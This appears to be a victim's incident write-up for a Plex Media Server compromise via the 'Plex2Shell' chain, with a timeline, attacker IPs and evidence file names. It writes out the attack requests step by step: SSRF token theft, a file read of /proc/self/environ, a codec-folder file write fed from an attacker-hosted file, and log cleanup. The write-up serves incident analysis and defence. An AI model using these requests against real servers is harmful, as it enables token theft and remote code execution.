# 00: Break-in (Plex2Shell)

**Vulnerability:** Plex Media Server before **1.43.3.10861**. This is the "Plex2Shell" chain (CVE-2026-96652 / -96654 / -96655 / -96656), listed in CISA KEV.

## How it works (as seen in the victim's own Plex logs)
1. **Steal the owner token (SSRF).** `GET /player/timeline/subscribe?...protocol=http://127.0.0.1:32400/system/agents/...GetResultFromNetwork?url=...` tricks Plex into calling itself. Every following request runs **as the server owner**.
2. **Read files (optional).** `GET /system/:/resources/x?resource_name=/proc/self/environ` reads any file the `plex` user can read. One attacker read `Preferences.xml`, which holds the Plex token.
3. **Arm the write.** `PUT /:/prefs?TranscoderH264Options=dump-yuv=<Plex>/Codecs/<id>/zzXXXXX.so:qp=0` tells the video encoder to dump its raw output into a file in the **Codecs** folder.
4. **Write the codec.** `GET /video/:/transcode/universal/start.m3u8?path=http://<attacker>:<port>/item.xml` makes Plex transcode the attacker's specially crafted "video". The decoded frames are byte-for-byte a Linux shared library, so the result is a working `zz*.so`.
5. **Clean up.** `PUT /:/prefs?TranscoderH264Options=` (empty) removes the evidence from the settings.

Plex then loads every `.so` in the Codecs folder, with no signature check. That starts stage 1.

## Timeline
| When (UTC) | What |
|---|---|
| 2026-10-26 05:21 | first successful plant: `zz92113.so` (logs for this period had already rotated away) |
| 2026-10-26 06:22 / 19:00, 2026-10-27 06:44 | further plants: `zz95748.so`, `zz41257.so`, `zz83494.so` |
| 2026-10-28 06:38 | attempt from **176.65.149.174** (`zz69492.so`), failed |
| 2026-10-28 08:01 | attempt from **43.108.122.170** (`*.sslip.io`), also sprays Docker/Synology/QNAP paths, failed |
| 2026-10-28 09:10 | attempt from **176.65.149.174** (`zz78638.so`), failed |

## Files
- `attacker_requests_2026-10-28.log`: every request and response from the two attackers on 28 Oct (sanitized).
- `example_full_chain_43.108.122.170.txt`: one complete run, from token theft to cleanup, one line per step.
